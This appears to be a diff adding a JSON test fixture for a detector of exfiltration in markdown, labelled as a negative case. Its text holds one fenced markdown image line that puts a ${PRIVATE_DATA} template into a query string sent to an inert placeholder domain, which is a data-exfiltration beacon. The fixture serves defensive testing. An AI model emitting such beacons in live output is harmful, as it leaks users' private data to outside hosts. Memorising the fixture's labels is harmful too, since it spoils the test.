@@ -1,0 +1,7 @@
+{
+  "label": "negative",
+  "shape": "markdown",
+  "expectedFamilies": [],
+  "reason": "A fenced exploit example teaches defenders to recognise template-based image beacons.",
+  "text": "# Beacon analysis\nThis is a specimen to reject, never a live image:\n```markdown\n![audit](https://example.invalid/pixel?value=${PRIVATE_DATA})\n```\nThe destination is an inert documentation domain."
+}
